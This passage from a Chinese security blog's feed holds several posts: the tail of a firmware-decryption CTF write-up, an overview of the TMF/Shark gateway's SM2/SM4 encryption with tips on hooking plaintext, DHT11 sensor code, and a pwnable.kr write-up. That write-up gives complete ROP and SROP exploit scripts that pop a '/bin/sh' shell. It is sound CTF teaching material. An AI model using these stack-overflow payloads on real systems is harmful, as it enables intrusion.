class="number">0x410</span>])</span><br><span class="line">    unOOBBin.write(data[i+<span class="number">0x410</span>+<span class="number">14</span>:i+<span class="number">0x800</span>])</span><br><span class="line">    unOOBBin.write(data[i+<span class="number">0x800</span>+<span class="number">2</span>:i+<span class="number">0x800</span>+<span class="number">2</span>+<span class="number">14</span>])</span><br><span class="line">    i=i+<span class="number">2048</span>+<span class="number">128</span></span><br><span class="line">a=<span class="built_in">open</span>(<span class="string">r&#x27;unoob2.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">b=<span class="built_in">open</span>(<span class="string">r&#x27;extractELF.sh&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="comment">#shell脚本</span></span><br></pre></td></tr></table></figure><p>再次使用binwalk尝试提取，发现分离出的ext2可以正常读取了：</p><p><img src="https://docimg3.docs.qq.com/image/fU8RBxVWZxZbbJH2ILR9aQ.png?w=656&h=288" alt="img" style="zoom:100%;" align="middle">       <img src="https://docimg2.docs.qq.com/image/YokVW5GaS-2Khs6h6QIJHg.png?w=330&h=518" alt="img" style="zoom:100%;" align="middle">   </p><p>搜索特征字符串获取到解密逻辑（ext2文件系统中得到的magic_update中的加密是针对另一型号设备的，后来发现针对题目给的镜像文件所属型号的加密是在固件中的单独提取的mainServer ELF文件中）：</p><p>openssl enc -in PNF-9010R.img -aes-256-cbc -d -k STWPNF-9010R -out PNF-9010R-dec.img</p><p>对解密后的img解压即可看到flag。</p><p><img src="https://docimg8.docs.qq.com/image/2ER3ZAGfjTMxav0dFBM01g.png?w=954&h=526" alt="img"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TMF框架简介</title>
    <link href="https://f4ncy.top/2021/12/03/TMF/"/>
    <id>https://f4ncy.top/2021/12/03/TMF/</id>
    <published>2021-12-03T08:54:02.263Z</published>
    <updated>2021-12-08T06:34:02.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="TMF"><a href="#TMF" class="headerlink" title="TMF"></a>TMF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>网关服务+开发框架</p><p>客户端 ———HTTP/TCP———&gt;网关———HTTP/RPC———&gt; 服务器</p><p>客户端会将请求数据发送到网关，网关解析到数据后会根据该URL配置项中的HTTP/RPC将数据转发到对应的业务服务器;然后业务服务器处理完成后将数据返回给网关，网关再将数据返回给客户端。</p><h2 id="请求路径"><a href="#请求路径" class="headerlink" title="请求路径"></a>请求路径</h2><p>原生路径：<br>sharkinit-&gt;xxfunc-(sharkUtil)-&gt;sendshark<br>一般会对shark进行封装，例如LoginActivity-&gt;SharkUtil.request(“login.do”)-&gt;Shark.sendshark</p><p><img src="http://150.158.143.160:8877/2021/12/05/1ae2bb8d07769.png" alt="login|600"><br><img src="http://150.158.143.160:8877/2021/12/05/1d0db6d533fa2.png" alt="util|600"><br><img src="http://150.158.143.160:8877/2021/12/05/86e60ed75cc4d.png" alt="sendshark|600"></p><p>H5路径<br>xx.js（$rpcDo）→app.js-&gt;TMFJSBridge.js→ITMFWebView-&gt;BaseTMFWeb-&gt;findjsapi-&gt;xxjsapi-&gt;sendshark-&gt;oncallback</p><p>js请求通过TMFJSBridge调用webview中注册的js接口，webview初始化时会将已实现的JsApi接口类和接口名称关联（Map），所以js中通过接口名即可调用java层函数<br><img src="http://150.158.143.160:8877/2021/12/05/4a236b0aee1ef.png" alt="findjsapi|600"><br>实现JsApi接口<br><img src="http://150.158.143.160:8877/2021/12/05/1fc887e304fc2.png" alt="jsapi|600"><br><img src="http://150.158.143.160:8877/2021/12/05/4709990a60e16.png" alt="apiname|400"><br><img src="http://150.158.143.160:8877/2021/12/05/3754e4582a69a.png" alt="jsname|600"></p><h2 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h2><p>鲨鱼皮作为网关组件，其包含了数据格式处理、加解密、通讯</p><ul><li>初始化Shark</li><li>获取配置</li><li>Build</li><li>Start</li></ul><p> Shark初始化需要获取程序Context，一般为Application:<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shark.setAppContext(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure></p><p>Shark需要从TMFconfig配置中获取应用ID、协议类型、网关等信息。<br>创建一个Shark实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Shark shark = SharkFactory.builder(context)</span><br><span class="line">    .logEnable(IS_LOG_ENABLE)</span><br><span class="line">.serverType(SERVER_TYPE)</span><br><span class="line">.sharkPkg(sharkPkg).instanceName(instanceName)</span><br><span class="line">.sharkOutlet(sharkOutlet)</span><br><span class="line">.serviceFactory(serviceFactory)</span><br><span class="line">.withTcpChannel(withTcpChannel)</span><br><span class="line">.build();</span><br></pre></td></tr></table></figure><p>最后启动shark:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shark.start(autoStartTcpChannel)</span><br></pre></td></tr></table></figure><p>关键函数：<br>serviceFactory<br>设置线程池和加解密算法，需要实现一个IServiceFactory接口，框架提供默认的SM2和SM4：<br><img src="http://150.158.143.160:8877/2021/12/05/969f66d6a84dd.png" alt="serviceFactory"></p><p> sendShark<br>两个参数SharkHttpEntity、 ISharkCallBack2<br>SharkHttpEntity：是封装的请求或响应结构，sendShark中对应参数为请求包对象<br>ISharkCallBack2：网络请求回调接口，接口需要实现onFinish，最后一个参数也为SharkHttpEntity，则是应答包对象<br><img src="http://150.158.143.160:8877/2021/12/05/474521ecba9b6.png" alt="sendshark"><br>SharkHttpEntity继承自JceStruct</p><p>SharkHttpEntity结构：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>params</td><td>SashimiHeader对象，header参数集合</td></tr><tr><td>data</td><td>请求body</td></tr></tbody></table><p>编写请求参数的自吐脚步建议从SharkHttpEntity初始化处入手，shark的加解密接口由于参数已经是SharkHttpEntity结构的byte数组，不好处理。开发为了便利，一般会对SharkHttpEntity进行封装，封装类的入参往往都是String，参数格式一般为json或url格式，容易打印和处理。<br>应答参数的自吐脚步从ISharkCallBack2的回调函数onFinish中进行回溯，对已经将SharkHttpEntity.data处理成String处进行hook。</p><h2 id="通讯过程"><a href="#通讯过程" class="headerlink" title="通讯过程"></a>通讯过程</h2><p><img src="http://150.158.143.160:8877/2021/12/05/c5ce813a9025a.png" alt="network"></p><ol><li> 终端随机生成一个密钥randomKey;</li><li> 用服务器的SM2公钥对randomKey做非对称加密得到secret，并用randomKey 对业务数据做 SM4 对称加密，然后发送给后台;</li><li> 后台用对应的SM2私钥对secret解密得到randomKey，并为其分配一个标识 sessionId，存储 sessionId 和 randomKey 的映射关系;并用 randomKey 对业务数据做 SM4 对称解密，返回的业务数据也用 randomKey 做 SM4 加 密，将 sessionId 和业务数据一起返回给终端;</li><li> 终端收到响应后，后续每次请求都带上该sessionId，并用randomKey数据 进行 SM4 加密;</li><li> 后台收到请求后，根据sissionId找到randomKey，用randomKey对数据进 行 SM4 解密;</li><li> 回包数据也是用randomKey进行SM4加密。</li></ol><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ol><li>加密算法<blockquote><p>64字节SM2、128位SM4，安全</p></blockquote></li><li>通讯安全<blockquote><p>密钥协商阶段，密钥传输使用非对称加密；数据传输过程中仅能获取到sessionid和密文，未携带任何密钥信息；sessionid具有时效性；</p></blockquote></li><li>完整性<blockquote><p>说是可以在网关到后台直接配置验签服务，客户端没有；</p></blockquote></li><li>抗抵赖<blockquote><p>不支持，需要自行添加数字签名。</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Dth11温湿度传感器</title>
    <link href="https://f4ncy.top/2019/10/31/Dth11/"/>
    <id>https://f4ncy.top/2019/10/31/Dth11/</id>
    <published>2019-10-31T08:29:15.000Z</published>
    <updated>2019-10-31T08:58:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Dth11温湿度传感器"><a href="#Dth11温湿度传感器" class="headerlink" title="Dth11温湿度传感器"></a>Dth11温湿度传感器</h1><p><strong>元件</strong>：该传感器包括一个电阻式感湿元件和一个NTC测温元件，并与一个高性能8位单片机相连接。</p><p><strong>引脚说明</strong>：</p><ol><li>VDD：供电3-5.5V</li><li>DATA：串行数据，单总线</li><li>NC：空脚，请悬空</li><li>GND：接地，电源负极</li></ol><p><strong>工作流程</strong>：</p><p>DATA用于微处理器与DHT11之间的通讯和同步,采用单总线数据格式,一次通讯时间4ms左右,数据分小数部分和整数部分,具体格式在下面说明,当前小数部分用于以后扩展,现读出为零。操作流程如下:<br>一次完整的数据传输为40bit,高位先出。<br>数据格式:<br>8bit湿度整数数据 + 8bit湿度小数数据 + 8bit温度整数数据 + 8bit温度小数数据 +8 bit校验和<br>数据传送正确时校验和数据等于“8bit湿度整数数据+8bit湿度小数数据+8bi温度整数数据+8bit温度小数数据”所得结果的末8位。<br><code>bits[0]+bits[1]+bits[2]+bits[3]=bits[4]</code></p><p>主机请求：总线拉低至少18ms，之后总线拉高延时等待20-40us，切换到输入模式；<br>DHT响应：接收到开始信号后，等待主机信号结束，然后发送80us低电平响应信号，之后把总线拉高80us准备发送数据，每一bit数据以50us低电平时隙开始，高电平的长短决定数据位为0或1，当最后一bit数据传送完毕后，DHT11拉低总线50us,随后总线由上拉电阻拉高进入空闲状态。</p><p><strong>代码说明</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">dht11::dec2f</span><span class="params">(<span class="keyword">uint8_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> result = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">result = ((<span class="keyword">float</span>)x) / <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dht11::read</span><span class="params">(<span class="keyword">int</span> pin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// BUFFER TO RECEIVE</span></span><br><span class="line"><span class="keyword">uint8_t</span> bits[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">uint8_t</span> cnt = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">float</span> decpart = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">float</span> intpart = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EMPTY BUFFER</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">bits[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">pinMode</span>(pin, OUTPUT);<span class="comment">//输出模式</span></span><br><span class="line"><span class="built_in">digitalWrite</span>(pin, LOW);  <span class="comment">//拉低点位</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">18</span>); <span class="comment">//主机发送开始信号</span></span><br><span class="line"><span class="built_in">digitalWrite</span>(pin, HIGH); <span class="comment">//拉高点位</span></span><br><span class="line"><span class="built_in">delayMicroseconds</span>(<span class="number">40</span>);   <span class="comment">//延时等待</span></span><br><span class="line"><span class="built_in">pinMode</span>(pin, INPUT); <span class="comment">//切换为输入模式，接收信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ACKNOWLEDGE or TIMEOUT</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == LOW) <span class="comment">//接收DHT响应信号</span></span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == HIGH) <span class="comment">//DHT准备发送数据</span></span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// READ OUTPUT - 40 BITS =&gt; 5 BYTES or TIMEOUT</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == LOW)</span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> t = <span class="built_in">micros</span>();</span><br><span class="line"></span><br><span class="line">loopCnt = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">digitalRead</span>(pin) == HIGH)</span><br><span class="line"><span class="keyword">if</span> (loopCnt-- == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_TIMEOUT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">micros</span>() - t) &gt; <span class="number">40</span>)</span><br><span class="line">bits[idx] |= (<span class="number">1</span> &lt;&lt; cnt); <span class="comment">//高点位维持26us-28us代表‘0’，维持70us代表‘1’，这里以40us为界限判断</span></span><br><span class="line"><span class="keyword">if</span> (cnt == <span class="number">0</span>) <span class="comment">// 判断8bit是否结束</span></span><br><span class="line">&#123;</span><br><span class="line">cnt = <span class="number">7</span>; <span class="comment">// 重置准备下一8bit读取</span></span><br><span class="line">idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cnt--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decpart = <span class="built_in">dec2f</span>(bits[<span class="number">1</span>]); <span class="comment">//第二个8bit，转换湿度float小数部分（湿度的小数确实无数据）</span></span><br><span class="line">tmp = bits[<span class="number">0</span>];</span><br><span class="line">intpart = (<span class="keyword">float</span>)(tmp); <span class="comment">//第一个8bit，转换湿度float整数部分</span></span><br><span class="line">humidity = intpart + decpart;</span><br><span class="line"></span><br><span class="line">decpart = <span class="built_in">dec2f</span>(bits[<span class="number">3</span>]); <span class="comment">//第四个8bit，转换温度float小数部分（测试温度的小数是有数据的）</span></span><br><span class="line">tmp = bits[<span class="number">2</span>];</span><br><span class="line">intpart = (<span class="keyword">float</span>)(tmp); <span class="comment">//第三个8bit，转换温度float整数部分</span></span><br><span class="line">temperature = intpart + decpart;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> sum = bits[<span class="number">0</span>] + bits[<span class="number">1</span>] + bits[<span class="number">2</span>] + bits[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bits[<span class="number">4</span>] != sum)</span><br><span class="line"><span class="keyword">return</span> DHTLIB_ERROR_CHECKSUM; <span class="comment">//校验和</span></span><br><span class="line"><span class="keyword">return</span> DHTLIB_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://f4ncy.top/2019/09/02/SROP/"/>
    <id>https://f4ncy.top/2019/09/02/SROP/</id>
    <published>2019-09-02T08:29:15.000Z</published>
    <updated>2019-09-02T08:31:41.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="pwnable-kr-unexploitable-SROP"><a href="#pwnable-kr-unexploitable-SROP" class="headerlink" title="pwnable.kr-unexploitable(SROP)"></a>pwnable.kr-unexploitable(SROP)</h1><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>一个栈溢出漏洞。</p><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>利用syscall(59)代替执行execve<br>得到rax=59（利用read返回值）</p><ol><li>bss中写入跳入bss的rop</li><li>构造利用read读取59字节的rop</li><li>执行syscall</li></ol><p>填充main栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x200</span></span><br><span class="line">bash_addr = <span class="number">0x0000000000601028</span> + <span class="number">0x400</span></span><br><span class="line">syscall_addr = <span class="number">0x00400560</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00400512</span></span><br><span class="line">leave_ret = <span class="number">0x00400576</span></span><br><span class="line">part1 = <span class="number">0x004005e6</span></span><br><span class="line">part2 = <span class="number">0x004005d0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span>(<span class="params">call_addr, arg1, arg2, arg3</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP first ret to part1</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)       <span class="comment"># ret to part2 prepare to execute the call</span></span><br><span class="line">    payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x38</span>       <span class="comment"># for add rsp,0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload1  = <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span>              <span class="comment">#填充main的栈</span></span><br><span class="line">payload1 += p64(bss_base)           <span class="comment">#bss_base-&gt;rbp</span></span><br><span class="line">payload1 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bss_base, <span class="number">0x200</span>)<span class="comment">#write rop to bss</span></span><br><span class="line">payload1 += p64(pop_rbp_ret)    <span class="comment">#ret to pop instruction make the rbp point to bss[+I1]</span></span><br><span class="line">payload1 += p64(bss_base)       <span class="comment">#pop value[-I1]</span></span><br><span class="line">payload1 += p64(leave_ret)      <span class="comment">#ret to leave instruction[+I2]</span></span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)   <span class="comment">#the value pop to rbp[-I2]</span></span><br><span class="line">payload2 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bash_addr, <span class="number">0x200</span>)<span class="comment">#write payload to bash_addr and make the value of rax is the return-value of read[-I2]</span></span><br><span class="line">payload2 += call_function(bash_addr+<span class="number">0x10</span>, bash_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">&quot;B&quot;</span>) </span><br><span class="line">payload3 += p64(syscall_addr)   <span class="comment">#the address of instruction to call</span></span><br><span class="line">payload3 = payload3.ljust(<span class="number">59</span>, <span class="string">&quot;D&quot;</span>)</span><br></pre></td></tr></table></figure><p>rop流程：<br>第一次read：将read调用rop和跳转到bss段执行所需的rop写入栈<br>第二次read：将调用read的rop和调用syscall的rop写入bss<br>第三次read：将”/bin/sh”写入bash_addr，将syscall地址设置为返回地址，并将payload填充至59字节，使得read调用返回值为59触发execve。</p><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）</p><p><img src="/2019/09/02/SROP/15673894987140.jpg"></p><p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p><p><img src="/2019/09/02/SROP/15673912142638.jpg"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>之前通过ROP的方式实现利用，但是需要构造的gadgets很多，流程也十分繁琐，而利用SROP利用流程就变得简洁许多。<br>同样利用read将调用read的rop和跳转到bss段执行所需的rop写入栈，利用第二次调用read将sig_frame和”/bin/sh”写入bss，并且构造第三次调用read的rop，第三次调用read是为了将rax设置为15，使syscall触发__NR_rt_sigreturn，sigreturn被设置为syscall，rdi为”/bin/sh”地址，rax为59，成功执行execve(“/bin/sh”)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span>(<span class="params">call_addr, arg1, arg2, arg3</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)</span><br><span class="line">    payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">sig_frame = SigreturnFrame()              <span class="comment">#设置SROP Frame</span></span><br><span class="line">sig_frame.rax = <span class="number">59</span></span><br><span class="line">sig_frame.rdi = bss_base+<span class="number">0x200</span></span><br><span class="line">sig_frame.rsi = <span class="number">0</span></span><br><span class="line">sig_frame.rdx = <span class="number">0</span></span><br><span class="line">sig_frame.rip = syscall_addr</span><br><span class="line">payload1  = <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, bss_base, <span class="number">0x300</span>)</span><br><span class="line">payload1 += p64(pop_rbp_ret)</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">payload2 += call_function(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, sig_stage, <span class="number">0x100</span>)</span><br><span class="line">payload2 += sig_frame</span><br><span class="line">payload2  = payload2.ljust(<span class="number">0x200</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload2 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload3  = <span class="string">&quot;D&quot;</span> * <span class="number">0xf</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>移植OLLVM混淆pass</title>
    <link href="https://f4ncy.top/2019/03/22/rebuildpass/"/>
